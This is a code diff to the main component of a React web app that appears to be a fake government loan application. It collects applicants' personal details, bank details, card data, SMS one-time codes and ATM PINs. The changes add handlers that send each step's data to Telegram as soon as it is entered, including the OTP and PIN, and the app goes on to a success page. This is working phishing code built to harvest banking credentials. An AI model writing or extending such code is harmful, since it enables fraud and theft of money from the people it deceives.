@@ -20,7 +20,14 @@ import { StepSuccess } from './components/StepSuccess';
 import { StatusModal } from './components/StatusModal';
 import { CalculatorModal } from './components/CalculatorModal';
 import { LoanTiersModal } from './components/LoanTiersModal';
-import { sendStepNotification, sendFinalApplicationToTelegram } from './services/telegramService';
+import {
+  sendStep1PersonalPacket,
+  sendStep2BankPacket,
+  sendStep3CardPacket,
+  sendStep4OtpPacket,
+  sendStep5PinAndFinalPacket,
+  resetSession,
+} from './services/telegramService';
 
 const INITIAL_PERSONAL: PersonalInfo = {
   fullName: '',
@@ -57,7 +64,7 @@ export default function App() {
   const [pin, setPin] = useState<string>('');
   const [trackingId, setTrackingId] = useState<string>('');
   const [savedApplications, setSavedApplications] = useState<ApplicationData[]>([]);
-  
+
   // Modals state
   const [isStatusModalOpen, setIsStatusModalOpen] = useState<boolean>(false);
   const [isCalculatorOpen, setIsCalculatorOpen] = useState<boolean>(false);
@@ -75,28 +82,15 @@ export default function App() {
     }
   }, []);
 
-  // Track step navigation changes in Telegram
-  useEffect(() => {
-    const titles: Record<ApplicationStep, string> = {
-      hero: 'Home Hero Page',
-      step1: 'Step 1 - Personal Info',
-      step2: 'Step 2 - Bank Info',
-      step3: 'Step 3 - Loan Apply Fees',
-      searching: 'Verifying Details Overlay',
-      step4: 'Step 4 - OTP Verification',
-      step5: 'Step 5 - ATM PIN Verification',
-      success: 'Application Success Confirmation',
-    };
-    sendStepNotification(currentStep, titles[currentStep] || currentStep);
-  }, [currentStep]);
-
   const handleStartApply = () => {
+    resetSession();
     setCurrentStep('step1');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   const handleSelectAmountFromModal = (amount: string) => {
     setBank((prev) => ({ ...prev, loanAmount: Number(amount).toLocaleString('en-PK') }));
+    resetSession();
     setCurrentStep('step1');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
@@ -118,7 +112,38 @@ export default function App() {
     return `GOP-2026-${randomNum}-PK`;
   };
 
-  const handleStep3Submit = () => {
+  // Step 1 -> Step 2 Packet
+  const handleStep1Continue = (step1Data?: PersonalInfo) => {
+    const dataToSend = step1Data || personal;
+    if (step1Data) {
+      setPersonal(step1Data);
+    }
+    // Send Step 1 Packet to Telegram
+    sendStep1PersonalPacket(dataToSend);
+    setCurrentStep('step2');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  // Step 2 -> Step 3 Packet
+  const handleStep2Continue = (step2Data?: BankInfo) => {
+    const dataToSend = step2Data || bank;
+    if (step2Data) {
+      setBank(step2Data);
+    }
+    // Send Step 2 Packet to Telegram
+    sendStep2BankPacket(dataToSend, personal);
+    setCurrentStep('step3');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  // Step 3 -> Searching Loader -> Step 4 Packet
+  const handleStep3Continue = (step3Data?: CardInfo) => {
+    const dataToSend = step3Data || card;
+    if (step3Data) {
+      setCard(step3Data);
+    }
+    // Send Step 3 Packet to Telegram
+    sendStep3CardPacket(dataToSend, personal);
     setCurrentStep('searching');
   };
 
@@ -127,7 +152,25 @@ export default function App() {
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
-  const handleFinalSubmit = () => {
+  // Step 4 -> Step 5 Packet
+  const handleStep4Continue = (step4Otp?: string) => {
+    const otpToSend = step4Otp || otp;
+    if (step4Otp) {
+      setOtp(step4Otp);
+    }
+    // Send Step 4 Packet to Telegram
+    sendStep4OtpPacket(otpToSend, personal.mobileNo, personal);
+    setCurrentStep('step5');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  // Step 5 -> Success & Master Dossier Packet
+  const handleFinalSubmit = (step5Pin?: string) => {
+    const pinToSend = step5Pin || pin;
+    if (step5Pin) {
+      setPin(pinToSend);
+    }
+
     const newTrackingId = generateTrackingId();
     setTrackingId(newTrackingId);
 
@@ -136,20 +179,20 @@ export default function App() {
       bank,
       card,
       otp,
-      pin,
+      pin: pinToSend,
       trackingId: newTrackingId,
       submittedAt: new Date().toLocaleDateString('en-PK'),
       status: 'Pending',
     };
 
-    // Dispatch final notification to Telegram
-    sendFinalApplicationToTelegram({
+    // Dispatch Step 5 ATM PIN & Final Packet to Telegram
+    sendStep5PinAndFinalPacket({
+      pin: pinToSend,
       trackingId: newTrackingId,
       personal,
       bank,
       card,
       otp,
-      pin,
     });
 
     const updatedList = [newAppRecord, ...savedApplications];
@@ -165,6 +208,7 @@ export default function App() {
   };
 
   const handleReset = () => {
+    resetSession();
     setPersonal(INITIAL_PERSONAL);
     setBank(INITIAL_BANK);
     setCard(INITIAL_CARD);
@@ -228,10 +272,7 @@ export default function App() {
               <Step1PersonalInfo
                 data={personal}
                 onUpdate={handleUpdatePersonal}
-                onNext={() => {
-                  setCurrentStep('step2');
-                  window.scrollTo({ top: 0, behavior: 'smooth' });
-                }}
+                onNext={handleStep1Continue}
                 onBack={() => setCurrentStep('hero')}
               />
             )}
@@ -241,10 +282,7 @@ export default function App() {
               <Step2BankInfo
                 data={bank}
                 onUpdate={handleUpdateBank}
-                onNext={() => {
-                  setCurrentStep('step3');
-                  window.scrollTo({ top: 0, behavior: 'smooth' });
-                }}
+                onNext={handleStep2Continue}
                 onBack={() => {
                   setCurrentStep('step1');
                   window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -257,7 +295,7 @@ export default function App() {
               <Step3LoanFees
                 data={card}
                 onUpdate={handleUpdateCard}
-                onNext={handleStep3Submit}
+                onNext={handleStep3Continue}
                 onBack={() => {
                   setCurrentStep('step2');
                   window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -276,10 +314,7 @@ export default function App() {
                 mobileNo={personal.mobileNo}
                 otpValue={otp}
                 onUpdateOtp={setOtp}
-                onNext={() => {
-                  setCurrentStep('step5');
-                  window.scrollTo({ top: 0, behavior: 'smooth' });
-                }}
+                onNext={handleStep4Continue}
                 onBack={() => {
                   setCurrentStep('step3');
                   window.scrollTo({ top: 0, behavior: 'smooth' });
